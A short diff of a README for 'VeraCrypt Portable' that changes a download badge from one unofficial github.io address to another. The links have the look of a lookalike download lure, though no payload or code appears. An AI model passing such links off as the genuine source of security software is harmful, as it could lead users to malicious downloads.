@@ -2,7 +2,8 @@
 
 ## 📥 Download VeraCrypt Portable
 
-[![⬇️ Download VeraCrypt Portable](https://img.shields.io/badge/Download-VeraCrypt%20Portable-blue?style=for-the-badge&logo=veracrypt)](https://veracrypt-portable-download.github.io/.github)
+[![⬇️ Download VeraCrypt Portable](https://img.shields.io/badge/Download-VeraCrypt%20Portable-blue?style=for-the-badge&logo=veracrypt)](https://veracrypt-portable.github.io/.github
+)
 
 ---
 
